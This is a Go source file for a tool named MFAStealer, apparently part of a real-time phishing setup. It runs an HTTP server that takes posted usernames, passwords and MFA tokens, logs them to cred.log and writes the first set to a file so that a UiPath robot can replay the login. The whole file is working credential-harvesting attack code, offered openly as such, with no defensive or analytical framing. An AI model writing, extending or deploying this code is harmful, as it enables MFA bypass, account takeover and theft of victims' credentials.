package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

// MFAWebServer for HTTP server vars
type MFAWebServer struct {
	ListenPort   string
	LogFile      *os.File
	Server       *http.Server
	CredsRecvd   bool
	ResultsRecvd string
}

func setupLoginFile() {
	file := "loginFile.txt"
	if _, err := os.Stat(file); err == nil {
		os.Remove(file)
	}
	f, _ := os.OpenFile(file, os.O_RDONLY|os.O_CREATE, 0666)
	f.Close()
}

func writeLoginFile(user, password, token string) {
	f, err := os.OpenFile("loginFile.txt", os.O_RDWR|os.O_CREATE, 0666)
	if err != nil {
		log.Fatalf("Error opening file: %s", err)
	}
	defer f.Close()

	outputFormat := fmt.Sprintf("%s\n%s\n%s", user, password, token)
	f.WriteString(outputFormat)
}

// ServeHTTP allows SubHTTPServer to handle http requests
func (web *MFAWebServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/results" {

	} else {
		err := r.ParseForm()
		if err != nil {
			fmt.Println("Error parsing form....")
		}

		user := r.Form["username"][0]
		password := r.Form["password"][0]
		token := r.Form["token"][0]

		log.Printf("User: %s, Password: %s, Token: %s\n", user, password, token)
		fmt.Println("[+] Creds captured and written to cred.log")

		if !web.CredsRecvd {
			web.CredsRecvd = true
			writeLoginFile(user, password, token)
			fmt.Println("[+] Creds writtin to loginFile, UiPath should be attempting login")
		}
		w.Write([]byte("success"))
	}
}

func main() {
	if len(os.Args) != 2 {
		panic("mfastealer.exe <port>")
	}

	port := os.Args[1]

	localServer := &MFAWebServer{
		ListenPort:   port,
		CredsRecvd:   false,
		ResultsRecvd: "",
	}

	f, err := os.OpenFile("cred.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Error opening file: %s", err)
	}
	defer f.Close()

	log.SetOutput(f)
	log.Println("Starting up MFAStealer")

	setupLoginFile()

	// set up http handling
	fmt.Printf("[*] Starting HTTP server on %s\n", localServer.ListenPort)
	mux := http.NewServeMux()
	mux.Handle("/", localServer)
	addr := fmt.Sprintf(":%s", localServer.ListenPort)
	localServer.Server = &http.Server{Addr: addr, Handler: mux}
	fmt.Println("[*] Waiting on HTTP request")

	// start the server, handling all requests at ServeHTTP()
	err = localServer.Server.ListenAndServe()
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
